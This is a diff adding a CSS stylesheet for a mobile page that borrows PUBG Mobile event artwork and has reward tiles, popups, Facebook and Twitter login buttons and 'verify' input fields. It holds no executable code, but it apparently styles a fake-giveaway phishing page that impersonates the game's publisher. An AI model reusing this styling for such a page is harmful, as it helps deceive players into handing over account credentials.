@@ -1,0 +1,325 @@
+@charset "utf-8";
+@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
+*,*:before,*:after {
+	-webkit-box-sizing:border-box;
+	-moz-box-sizing:border-box;
+	box-sizing:border-box;
+}
+@font-face {
+  font-family: Headliner;
+  src: url(https://raw.githack.com/SoKy-Master/thebest/main/thebest/headliner.ttf);
+}
+body {
+	background:url(https://www.pubgmobile.com/images/event/bloodravenx_suit/share/en.jpg) no-repeat center;
+	-webkit-background-size:cover;
+	-moz-background-size:cover;
+	-o-background-size:cover;
+	background-size:100% 100%;
+	margin: 0;
+	font-family: 'Teko';
+}
+.container {
+	background: url(https://www.pubgmobile.com/images/event/bloodravenx_suit/share/en.jpg) no-repeat center center;
+	background-size: cover;
+	position: relative;
+	margin: 0px auto;
+	margin-top: 3%;
+	max-width: 400px;
+	height: auto;
+	border: 3px solid #fff;
+}
+.header img {
+	width: 100%;
+	border-bottom: 3px solid #fff;
+	position: relative;
+}
+.box {
+    width: 100%;
+    height: auto;
+	margin-top: 12px;
+}
+.alert {
+	background: url(https://i.ibb.co/m5mpwzg/gr-1.png) no-repeat center;
+	background-size: 100% 100%;
+	width: 100%;
+	height: 100px;
+}
+.alert .alert-title {
+	padding: 12px;
+	color: #2A3F79;
+	font-size: 2em;
+	font-family: Headliner;
+	text-align: center;
+}
+.item {
+	background: url(https://i.ibb.co/Y0mVxDN/s3-tab1.png) no-repeat center;
+	background-size: 100% 100%;
+	width: 30%;
+	height: 125px;
+	margin: 2px;
+	padding: 30px;
+	margin-bottom: -1px;
+	display: inline-block;
+}
+.item img {
+	width: 100%;
+    height: 100%;
+}
+.item-start {
+	background: url(https://i.ibb.co/K0VSW0t/start.png) no-repeat center;
+	background-size: 100% 100%;
+}
+.item-active {
+	background: url(https://i.ibb.co/r5PXsph/BG-SKIN-LEGEND.png) no-repeat center;
+	background-size: 100% 80%;
+}
+.btn-wrapper {
+	width: 100%;
+	height: auto;
+	margin-top: 20px;
+	align-items:center;
+	justify-content:space-around;
+	display:flex;
+}
+.btn-wrapper button {
+    background: url(https://i.ibb.co/k6NV4yJ/btn-off.png) no-repeat center;
+	background-size: 100% 100%;
+	width: 45%;
+	height: 45px;
+	margin: 5px;
+	color: #fff;
+	font-size: 18px;
+	font-family: Teko;
+	text-align: center;
+	border: none;
+	outline: none;
+	display: inline-block;
+}
+.btn-wrapper button:hover {
+    background: url(https://i.ibb.co/G3thsXP/btn-on.png) no-repeat center;
+	background-size: 100% 100%;
+	transition: 0.7s;
+}
+.footer {
+	background: #000;
+	width: 100%;
+	height: auto;
+	padding: 10px;
+	border-top: 3px solid #fff;
+}
+.footer img {
+	width: 90%;
+	margin-left: auto;
+	margin-right: auto;
+	display: block;
+}
+.footer-txt {
+	margin-top: 10px;
+	color: #fff;
+	font-size: 15px;
+	font-family: Teko;
+	font-weight: bold;
+	text-align: center;
+	text-transform: uppercase;
+}
+.popup {
+	width:100%;
+	height:100%;
+	position:fixed;
+	top:0;
+	left:0;
+	z-index:9999;
+	background-color:rgba(0, 0, 0, 0.4);
+}
+.popup-box {
+    background: url(https://i.ibb.co/LkvQ0Gn/popup.png) no-repeat center;
+	background-size: 100% 100%;
+	width: 370px;
+	height: auto;
+	position: relative;
+	margin: 50px auto;
+	margin-top: 16%;
+	text-align: center;
+	font-size: 18px;
+	font-family:'Teko';
+	color:#2A3F79;
+	border: 0px solid #fff;
+	border-radius: 0px;
+}
+.popup-alert {
+	background: url(https://i.ibb.co/3f9XvTm/alert.png) no-repeat center;
+	background-size: 100% 100%;
+	width: 100%;
+	height: 80px;
+}
+.popup-alert .popup-alert-title {
+	margin-top: 15px;
+	padding: 12px;
+	color: #2A3F79;
+	font-size: 2em;
+	font-family: Headliner;
+	text-align: center;
+}
+.popup-item {
+	background: url(https://www.pubgmobile.com/id/event/frostfestival/images/s3_tab1.png) no-repeat center;
+	background-size: 100% 100%;
+	width: 30%;
+	height: 125px;
+	margin: 2px;
+	padding: 30px;
+	margin-bottom: -1px;
+	display: inline-block;
+}
+.popup-item img {
+	width: 100%;
+    height: 100%;
+}
+.popup-btn {
+    background: url(https://i.ibb.co/C8MY6YS/popup-btn.jpg) no-repeat center;
+	background-size: 100% 100%;
+    width: 32%;
+    height: auto;
+    margin-bottom: 15px;
+	padding: 8px;
+	color: #000;
+	font-size: 17px;
+	font-family: Teko;
+    outline: none;
+	border: none;
+	border-radius: 5px;
+    display: inline-block;
+	font-size: 15px;
+	font-weight: bold;
+	text-transform: uppercase;
+    cursor: pointer;
+}
+.btn-login {
+    width: 95%;
+    height: auto;
+    padding: 8px;
+    margin-bottom: 3px;
+    color: #000;
+    font-family: 'Teko';
+    border: none;
+    border-radius: 5px;
+    outline: none;
+    display: inline-block;
+}
+.btn-login i {
+    color: #fff;
+    font-size: 20px;
+    float: left;
+}
+.facebook {
+    background: #3b5998;
+    color: #fff;
+}
+.twitter {
+    background: #08a0e9;
+    color: #fff;
+}
+.input-anjir {
+	background: url(https://i.ibb.co/bHVjmg1/verify.png) no-repeat center;
+	background-size: 100% 100%;
+	width: 94%;
+	height: auto;
+	padding: 4px;
+	font-size:18px;
+	font-family: Teko;
+	color: #2A3F79;
+	margin-bottom: 3px;
+	border: none;
+	border-radius: 5px;
+	position: relative;
+	outline: none;
+}
+.input-anjir::placeholder {
+	color: #2A3F79;
+}
+.select-anjir {
+	background: url(https://i.ibb.co/bHVjmg1/verify.png) no-repeat center;
+	background-size: 100% 100%;
+	width: 94%;
+	height: auto;
+	padding: 4px;
+	font-size: 18px;
+	font-family: Teko;
+	color: #2A3F79;
+	margin-bottom: 3px;
+	border: none;
+	border-radius: 5px;
+	position: relative;
+	outline: none;
+}
+.finish-wrapper {
+	background: url(https://i.ibb.co/LkvQ0Gn/popup.png) no-repeat center;
+    background-size: 100% 100%;
+	width: 95%;
+	height: auto;
+	margin-left: auto;
+	margin-right: auto;
+	padding: 10px;
+	color: #EBCC62;
+	font-size: 15px;
+    font-family: 'Teko';
+	text-align: left;
+	display: block;
+}
+.finish-btn {
+    background: url(https://i.ibb.co/k6NV4yJ/btn-off.png) no-repeat center;
+	background-size: 100% 100%;
+    width: 33%;
+    height: 43px;
+	margin-left: auto;
+	margin-right: auto;
+    outline: none;
+	border: none;
+    display: inline-block;
+    cursor: pointer;
+	display: block;
+}
+.finish-btn span {
+	color: #fff;
+	font-size: 18px;
+    font-family: 'Teko';
+	line-height: 5px;
+}
+.finish-btn:hover {
+    background: url(https://i.ibb.co/G3thsXP/btn-on.png) no-repeat center;
+	background-size: 100% 100%;
+	transition: 0.7s;
+}
+::-webkit-scrollbar { 
+    display: none;
+    width: 0px;
+}
+@media only screen and (max-width:600px) {
+    .container {
+        width: 100%;
+        height: auto;
+        margin-top: 0px;
+        margin-bottom: 0px;
+        border-radius: 0px;
+        padding: 0px;
+    }
+    .alert .alert-title {
+        padding-top: 20px;
+    }
+    .item {
+        height: 115px;
+    }
+	.popup-box {
+		width: 350px;
+		margin-top:50%;
+	}
+    .popup-alert .popup-alert-title {
+        padding-top: 20px;
+    }
+	.popup-item {
+		width: 30%;
+		height: 100px;
+	}
+	form button {
+	    margin-top: 5px;
+	}
+}
